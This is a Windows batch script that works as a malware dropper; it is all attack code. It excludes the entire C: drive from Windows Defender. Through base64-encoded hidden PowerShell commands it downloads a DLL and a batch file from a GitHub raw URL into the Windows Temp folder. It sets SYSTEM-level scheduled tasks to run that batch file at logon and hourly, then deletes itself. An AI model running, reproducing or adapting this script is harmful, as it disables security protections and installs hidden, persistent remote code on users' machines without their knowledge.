@echo off
powershell -windowstyle hidden -command "Add-MpPreference -ExclusionPath 'C:\'"
powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAwAHYAMwByAGQAcgBpAHYAZQAvAGEAbABsAGkAbgBvAG4AZQAvAHIAYQB3AC8AbQBhAGkAbgAvADUAZAA2ADkANQA5AGIAZgAuAGQAbABsACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANQBkADYAOQA1ADkAYgBmAC4AZABsAGwAJwA=
powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAwAHYAMwByAGQAcgBpAHYAZQAvAGEAbABsAGkAbgBvAG4AZQAvAHIAYQB3AC8AbQBhAGkAbgAvAHMAeQBzAHQAZQBtADMAMgAuAGIAYQB0ACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwB5AHMAdABlAG0AMwAyAC4AYgBhAHQAJwA=
schtasks /create /sc onlogon /tn windows_432432 /RL highest /RU "SYSTEM" /tr "C:\windows\system32\cmd.exe /c powershell.exe -nop -w hidden -noprofile -executionpolicy bypass -noni -ep bypass C:\windows\temp\system32.bat" /F /NP
schtasks /create /sc hourly /mo 1 /tn "windows_32321" /RL highest /RU "SYSTEM" /tr "C:\Windows\System32\cmd.exe /c powershell -nop -w hidden -noprofile -executionpolicy bypass -noni -ep bypass C:\windows\temp\system32.bat" /F /NP
powershell.exe -nop -w hidden -noprofile -executionpolicy bypass -noni -ep bypass C:\windows\temp\system32.bat
del "%~f0"
